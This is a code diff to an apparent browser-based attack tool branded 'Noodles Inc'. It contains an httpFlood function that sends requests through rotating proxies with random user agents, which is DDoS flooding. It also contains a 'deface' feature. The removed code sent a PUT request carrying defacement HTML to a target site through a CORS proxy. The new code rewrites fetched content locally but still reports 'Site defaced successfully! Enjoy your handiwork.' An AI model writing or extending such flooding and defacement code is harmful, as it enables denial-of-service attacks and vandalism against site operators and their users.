@@ -203,13 +203,13 @@ function updateProxies() {
 // Load proxy list from public/main/proxies.js
 async function loadProxies() {
     try {
-        const response = await fetch('/public/main/proxies.js');
+        const response = await fetch('/public/main/proxies.json');
         if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
         const proxyData = await response.json();
         proxies = proxyData.proxies; // Assuming the JSON has a "proxies" array
-        logAction(`Loaded ${proxies.length} proxies from public/main/proxies.js`);
+        logAction(`Loaded ${proxies.length} proxies from public/main/proxies.json`);
     } catch (error) {
         console.error('Noodles Inc: Error loading proxies:', error);
         logAction(`Error loading proxies: ${error}`);
@@ -237,7 +237,6 @@ async function httpFlood(url, hexBytes, proxy) {
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 
         const fetchOptions = {
-            mode: 'cors', // Bypass CORS
             method: 'GET',
             headers: {
                 'User-Agent': randomUserAgent,
@@ -260,9 +259,10 @@ async function httpFlood(url, hexBytes, proxy) {
         // Proxy Integration with CORSproxy
         if (proxy) {
             const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`;
-            fetchOptions.proxy = proxyUrl;
-            console.log(`Using proxy: ${proxy} through CORSproxy`);
-            logAction(`Using proxy: ${proxy} through CORSproxy`);
+            // const proxyUrl = `http://api.scraperapi.com/?api_key=YOUR_API_KEY&url=${encodeURIComponent(url)}`;
+            fetchOptions.agent = new HttpsProxyAgent(proxyUrl);
+            console.log(`Using proxy: ${proxy}`);
+            logAction(`Using proxy: ${proxy}`);
         }
 
         const response = await fetch(url, fetchOptions);
@@ -506,11 +506,8 @@ let originalSiteContent = '';
 
 // Function to fetch content via CORS proxy
 async function fetchContentWithProxy(url) {
-    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(url)}`;
     try {
-        const response = await fetch(proxyUrl, {
-            mode: 'cors', // Required for CORS proxy
-        });
+        const response = await fetch(`https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(url)}`);
         if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
@@ -570,23 +567,28 @@ document.getElementById('applyDeface').addEventListener('click', async () => {
     }
 
     try {
-        // Attempt to send a PUT or POST request to replace the site's content
-        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`; // Use CORS proxy
-        const response = await fetch(proxyUrl, {
-            method: 'PUT', // Or 'POST', depending on the server's configuration
-            mode: 'cors',
-            headers: {
-                'Content-Type': 'text/html', // Set the content type to HTML
-            },
-            body: defaceCode, // Send the defacement code in the body
-        });
-
-        if (response.ok) {
-            logAction('Site defaced successfully!');
-            alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork.');
-        } else {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
+         // Fetch the target website using the proxy
+         const response = await fetch(`https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(targetUrl)}`);
+         if (!response.ok) {
+             throw new Error(`HTTP error! status: ${response.status}`);
+         }
+         const originalHTML = await response.text();
+ 
+         // Create a new HTML document to parse both the original and defacement code
+         const parser = new DOMParser();
+         const originalDoc = parser.parseFromString(originalHTML, 'text/html');
+         const defaceDoc = parser.parseFromString(defaceCode, 'text/html');
+ 
+         // Replace the entire body content of the original site with the defacement code
+         originalDoc.body.innerHTML = defaceDoc.body.innerHTML;
+ 
+         // Serialize the modified HTML back to a string
+         const defacedHTML = originalDoc.documentElement.outerHTML;
+ 
+         // Display the defaced content (for demonstration purposes)
+         document.write(defacedHTML);
+        logAction('Site defaced successfully!');
+        alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork.');
     } catch (error) {
         console.error('Noodles Inc: Error applying defacement:', error);
         logAction(`Error applying defacement: ${error}`);
